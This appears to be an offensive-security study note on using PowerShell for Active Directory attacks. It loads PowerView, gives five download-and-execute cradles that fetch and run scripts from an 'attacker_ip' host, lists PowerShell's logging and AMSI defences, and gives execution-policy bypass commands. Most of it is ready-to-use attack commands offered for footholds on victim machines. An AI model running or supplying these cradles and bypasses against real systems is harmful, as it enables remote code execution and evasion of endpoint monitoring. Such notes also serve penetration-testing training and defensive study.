# PowerShell

PowerShell provides access to almost everything in a windows plateform and Active Directory Environment which could be useful foe an attacker and provides the capability of running powerful scripts completely from memory making it ideal for foothold machines.

## PowerShell Scripts and Modules

- Load a PowerShell script using dot sourcing

```
. C:\AD\Tools\PowerView.ps1
```

- All the commands in a module can be listed with:

```
Get-Command -Module model_name
```

Or we can use the active directory powershell for better active directory information gathering.

## PowerShell Script Execution

There are many ways that get the scripts from a attacker http server and execute in the victim powershell

```
# using iex
iex (New-Object Net.WebClient).DownloadString('https://attacker_ip/payload.ps1')

# second way
$ie=New-Object -ComObject
InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://attacker_ip/evil.ps1
');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

# third way
PSv3 onwards - iex (iwr 'http://attacker_ip/evil.ps1')

# fourth way
$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://attacker_ip/evil.ps1',$false);$h.send();iex
$h.responseText

# 5th way
$wr = [System.NET.WebRequest]::Create("http://attacker_ip/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

Powershell malicious executions are detected by 

- System-wide transcription
- Script Block logging
- AntiMalware Scan Interface (AMSI)
- Constrained Language Mode (CLM) - Integrated with Applocker and
WDAC (Device Guard)

and there are execution policy to take care of these malicious executions. but it is not a security measure, it is present to prevent a user from accidently executing scripts

There are several ways to bypass it

```
powershell –ExecutionPolicy bypass
powershell –c <cmd>
powershell –encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```

There are many tools used for bypassing the powershell security in online.
